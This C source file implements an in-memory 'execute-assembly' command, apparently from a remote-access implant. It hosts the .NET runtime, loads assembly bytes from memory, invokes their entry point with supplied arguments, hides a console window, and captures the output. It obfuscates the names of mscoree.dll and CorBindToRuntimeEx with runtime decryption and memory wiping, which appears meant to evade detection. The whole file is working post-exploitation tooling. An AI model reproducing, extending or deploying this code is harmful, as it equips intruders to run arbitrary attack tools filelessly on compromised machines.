#define COBJMACROS
#define INITGUID
#include "commands.h"
#include "crypto.h"
#include "evs_strings.h"
#include <windows.h>
#include <cguid.h>
#include <mscoree.h>
#include <oleauto.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef HRESULT(STDAPICALLTYPE *CorBind_t)(
    LPCWSTR pwszVersion, LPCWSTR pwszBuildFlavor,
    DWORD dwStartupFlags, REFCLSID rclsid, REFIID riid, LPVOID *ppv);

static HRESULT _disp0(IDispatch *p, LPCOLESTR name, VARIANT *out)
{
    DISPID did = 0;
    HRESULT hr = p->lpVtbl->GetIDsOfNames(p, &IID_NULL,
                                          (LPOLESTR *)&name, 1, LOCALE_USER_DEFAULT, &did);
    if (FAILED(hr))
        return hr;
    DISPPARAMS dp = {NULL, NULL, 0, 0};
    if (out)
        VariantInit(out);
    return p->lpVtbl->Invoke(p, did, &IID_NULL, LOCALE_USER_DEFAULT,
                             DISPATCH_METHOD | DISPATCH_PROPERTYGET,
                             &dp, out, NULL, NULL);
}

static HRESULT _disp1(IDispatch *p, LPCOLESTR name, VARIANT *arg, VARIANT *out)
{
    DISPID did = 0;
    HRESULT hr = p->lpVtbl->GetIDsOfNames(p, &IID_NULL,
                                          (LPOLESTR *)&name, 1, LOCALE_USER_DEFAULT, &did);
    if (FAILED(hr))
        return hr;
    DISPPARAMS dp = {arg, NULL, 1, 0};
    if (out)
        VariantInit(out);
    return p->lpVtbl->Invoke(p, did, &IID_NULL, LOCALE_USER_DEFAULT,
                             DISPATCH_METHOD | DISPATCH_PROPERTYGET,
                             &dp, out, NULL, NULL);
}

static HRESULT _disp_invoke3(IDispatch *p, VARIANT *vObj, VARIANT *vParams, VARIANT *out)
{
    DISPID did = 0;
    LPCOLESTR name = L"Invoke_3";
    HRESULT hr = p->lpVtbl->GetIDsOfNames(p, &IID_NULL,
                                          (LPOLESTR *)&name, 1, LOCALE_USER_DEFAULT, &did);
    if (FAILED(hr))
        return hr;
    VARIANT args[2];
    args[0] = *vParams;
    args[1] = *vObj;
    DISPPARAMS dp = {args, NULL, 2, 0};
    if (out)
        VariantInit(out);
    return p->lpVtbl->Invoke(p, did, &IID_NULL, LOCALE_USER_DEFAULT,
                             DISPATCH_METHOD, &dp, out, NULL, NULL);
}

static size_t _read_pipe(HANDLE hPipe, char *buf, size_t bufsz)
{
    size_t off = 0;
    DWORD got = 0;
    while (off < bufsz - 1)
    {
        DWORD avail = 0;
        if (!PeekNamedPipe(hPipe, NULL, 0, NULL, &avail, NULL) || avail == 0)
        {
            /* wait briefly and retry once */
            Sleep(50);
            if (!PeekNamedPipe(hPipe, NULL, 0, NULL, &avail, NULL) || avail == 0)
                break;
        }
        DWORD to_read = (avail < (DWORD)(bufsz - 1 - off))
                            ? avail
                            : (DWORD)(bufsz - 1 - off);
        if (!ReadFile(hPipe, buf + off, to_read, &got, NULL))
            break;
        off += got;
    }
    buf[off] = '\0';
    return off;
}

int cmd_execasm(const uint8_t *asm_bytes, size_t asm_len,
                const char *args_str,
                char *output_buf, size_t output_size)
{
    if (!asm_bytes || !asm_len || !output_buf || output_size < 128)
        return -1;
    output_buf[0] = '\0';

    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
    HANDLE hRead = NULL, hWrite = NULL;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0))
    {
        snprintf(output_buf, output_size,
                 "[execasm] CreatePipe: %lu\n", GetLastError());
        return -1;
    }
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    AllocConsole();
    HWND hwcon = GetConsoleWindow();
    if (hwcon)
        ShowWindow(hwcon, SW_HIDE);

    HANDLE hOldOut = GetStdHandle(STD_OUTPUT_HANDLE);
    HANDLE hOldErr = GetStdHandle(STD_ERROR_HANDLE);
    SetStdHandle(STD_OUTPUT_HANDLE, hWrite);
    SetStdHandle(STD_ERROR_HANDLE, hWrite);

    HRESULT hr = E_FAIL;
    int ret = -1;

    char _dm[12], _fc[20];
    EVS_D(_dm, EVS_dll_mscoree); EVS_D(_fc, EVS_fn_CorBindToRuntimeEx);
    HMODULE hMscoree = LoadLibraryA(_dm);
    SecureZeroMemory(_dm, sizeof(_dm));
    if (!hMscoree)
    {
        SecureZeroMemory(_fc, sizeof(_fc));
        snprintf(output_buf, output_size, "[execasm] clr host missing\n");
        goto restore;
    }

    CorBind_t pCorBind = (CorBind_t)(void *)GetProcAddress(hMscoree, _fc);
    SecureZeroMemory(_fc, sizeof(_fc));
    if (!pCorBind)
    {
        snprintf(output_buf, output_size, "[execasm] CorBindToRuntimeEx missing\n");
        FreeLibrary(hMscoree);
        goto restore;
    }

    ICorRuntimeHost *pHost = NULL;
    hr = pCorBind(L"v4.0.30319", L"wks", 0,
                  &CLSID_CorRuntimeHost, &IID_ICorRuntimeHost, (void **)&pHost);
    if (FAILED(hr))
        hr = pCorBind(NULL, L"wks", 0,
                      &CLSID_CorRuntimeHost, &IID_ICorRuntimeHost, (void **)&pHost);

    if (FAILED(hr) || !pHost)
    {
        snprintf(output_buf, output_size,
                 "[execasm] CorBind: 0x%08lx\n", (unsigned long)hr);
        FreeLibrary(hMscoree);
        goto restore;
    }

    hr = ICorRuntimeHost_Start(pHost);
    /* 0x80131041 = HOST_E_ALREADY_STARTED — not an error */
    if (FAILED(hr) && hr != (HRESULT)0x80131041UL)
    {
        snprintf(output_buf, output_size,
                 "[execasm] CLR Start: 0x%08lx\n", (unsigned long)hr);
        ICorRuntimeHost_Release(pHost);
        FreeLibrary(hMscoree);
        goto restore;
    }

    IUnknown *pDomUnk = NULL;
    IDispatch *pAppDomain = NULL;
    IDispatch *pAssembly = NULL;
    IDispatch *pEntryPt = NULL;
    SAFEARRAY *pAsmSA = NULL;
    VARIANT vAsmArg, vAssembly, vEP, vObj, vParams, vRet;

    hr = ICorRuntimeHost_GetDefaultDomain(pHost, &pDomUnk);
    if (FAILED(hr) || !pDomUnk)
    {
        snprintf(output_buf, output_size,
                 "[execasm] GetDefaultDomain: 0x%08lx\n", (unsigned long)hr);
        goto clr_stop;
    }
    pDomUnk->lpVtbl->QueryInterface(pDomUnk, &IID_IDispatch, (void **)&pAppDomain);
    pDomUnk->lpVtbl->Release(pDomUnk);

    if (!pAppDomain)
    {
        snprintf(output_buf, output_size, "[execasm] QI IDispatch (AppDomain)\n");
        goto clr_stop;
    }

    {
        SAFEARRAYBOUND sab = {(ULONG)asm_len, 0};
        pAsmSA = SafeArrayCreate(VT_UI1, 1, &sab);
        if (!pAsmSA)
        {
            snprintf(output_buf, output_size, "[execasm] SafeArrayCreate\n");
            goto clr_stop;
        }
        void *pData = NULL;
        SafeArrayAccessData(pAsmSA, &pData);
        memcpy(pData, asm_bytes, asm_len);
        SafeArrayUnaccessData(pAsmSA);
    }

    VariantInit(&vAsmArg);
    vAsmArg.vt = VT_ARRAY | VT_UI1;
    vAsmArg.parray = pAsmSA;

    hr = _disp1(pAppDomain, L"Load_3", &vAsmArg, &vAssembly);
    VariantClear(&vAsmArg);
    pAppDomain->lpVtbl->Release(pAppDomain);
    pAppDomain = NULL;

    if (FAILED(hr) || vAssembly.vt != VT_DISPATCH || !vAssembly.pdispVal)
    {
        snprintf(output_buf, output_size,
                 "[execasm] AppDomain.Load_3: 0x%08lx\n", (unsigned long)hr);
        goto clr_stop;
    }
    pAssembly = vAssembly.pdispVal;

    hr = _disp0(pAssembly, L"get_EntryPoint", &vEP);
    pAssembly->lpVtbl->Release(pAssembly);
    pAssembly = NULL;

    if (FAILED(hr) || vEP.vt != VT_DISPATCH || !vEP.pdispVal)
    {
        snprintf(output_buf, output_size,
                 "[execasm] get_EntryPoint: 0x%08lx (no static Main?)\n",
                 (unsigned long)hr);
        goto clr_stop;
    }
    pEntryPt = vEP.pdispVal;

    VariantInit(&vObj);
    vObj.vt = VT_NULL;
    VariantInit(&vParams);
    vParams.vt = VT_NULL;

    if (args_str && args_str[0])
    {
        char *dup = _strdup(args_str);
        int nargs = 0;
        char *tok = strtok(dup, " \t");
        while (tok)
        {
            nargs++;
            tok = strtok(NULL, " \t");
        }
        free(dup);

        if (nargs > 0)
        {
            SAFEARRAYBOUND sb = {(ULONG)nargs, 0};
            SAFEARRAY *pStrSA = SafeArrayCreate(VT_VARIANT, 1, &sb);
            dup = _strdup(args_str);
            long i = 0;
            tok = strtok(dup, " \t");
            while (tok && i < nargs)
            {
                VARIANT vs;
                VariantInit(&vs);
                vs.vt = VT_BSTR;
                int wlen = MultiByteToWideChar(CP_ACP, 0, tok, -1, NULL, 0);
                vs.bstrVal = SysAllocStringLen(NULL, (UINT)(wlen - 1));
                MultiByteToWideChar(CP_ACP, 0, tok, -1, vs.bstrVal, wlen);
                SafeArrayPutElement(pStrSA, &i, &vs);
                VariantClear(&vs);
                i++;
                tok = strtok(NULL, " \t");
            }
            free(dup);
            vParams.vt = VT_ARRAY | VT_VARIANT;
            vParams.parray = pStrSA;
        }
    }

    VariantInit(&vRet);
    hr = _disp_invoke3(pEntryPt, &vObj, &vParams, &vRet);
    VariantClear(&vParams);
    VariantClear(&vRet);
    pEntryPt->lpVtbl->Release(pEntryPt);
    pEntryPt = NULL;

    ret = (SUCCEEDED(hr) || hr == (HRESULT)0x80131604UL) ? 0 : -1;
    if (ret != 0)
        snprintf(output_buf, output_size,
                 "[execasm] Invoke_3: 0x%08lx\n", (unsigned long)hr);

clr_stop:
    ICorRuntimeHost_Stop(pHost);
    ICorRuntimeHost_Release(pHost);
    FreeLibrary(hMscoree);

restore:
    SetStdHandle(STD_OUTPUT_HANDLE, hOldOut);
    SetStdHandle(STD_ERROR_HANDLE, hOldErr);
    CloseHandle(hWrite);
    FreeConsole();

    {
        size_t off = strlen(output_buf);
        size_t avail = output_size > off ? output_size - off - 1 : 0;
        if (avail > 0)
            off += _read_pipe(hRead, output_buf + off, avail + 1);
        if (off == 0)
            snprintf(output_buf, output_size, "(no output)\n");
    }

    CloseHandle(hRead);
    return ret;
}
